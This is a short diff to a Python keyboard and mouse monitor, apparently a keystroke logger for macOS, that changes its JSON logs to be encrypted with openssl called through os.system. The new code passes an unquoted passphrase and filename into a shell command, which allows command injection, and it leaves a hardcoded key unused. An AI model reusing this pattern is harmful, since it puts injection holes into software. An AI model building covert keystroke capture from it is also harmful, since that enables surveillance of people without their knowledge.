@@ -10,6 +10,7 @@ from pynput import keyboard, mouse
 import smtplib
 import sys
 import threading
+import uuid
 
 """
     MISCELLANEOUS
@@ -68,6 +69,19 @@ def get_focus_app_string():
     return workspace.activeApplication()['NSApplicationName']
 
 """
+    ENCRYPTION
+"""
+def write_encrypted_file(json_string, passphrase, filename):
+    key = 'fishing-in-the-river-champion!'
+
+    temp_json_file = str(uuid.uuid4())
+    with open(temp_json_file, 'w') as f:
+        f.write(json_string)
+    
+    os.system(f"openssl enc -aes-128-cbc -in {temp_json_file} -base64 -out '{filename}' -k {passphrase} -md sha256")
+    os.remove(temp_json_file)
+
+"""
     MONITORING
 """
 
@@ -89,8 +103,8 @@ class Monitor:
         self.mice = mouse.Listener(on_click=self.on_click)
     
     def log_to_file(self, json_string):
-        with open(f'{self.log_folder}/{timestamp()}.json', 'w') as log_file:
-            log_file.write(json_string)
+        filename = f'{self.log_folder}/{timestamp()}.json'
+        write_encrypted_file(json_string, self.passphrase, filename)
     
     def update_text(self):
         # don't update text if it is empty
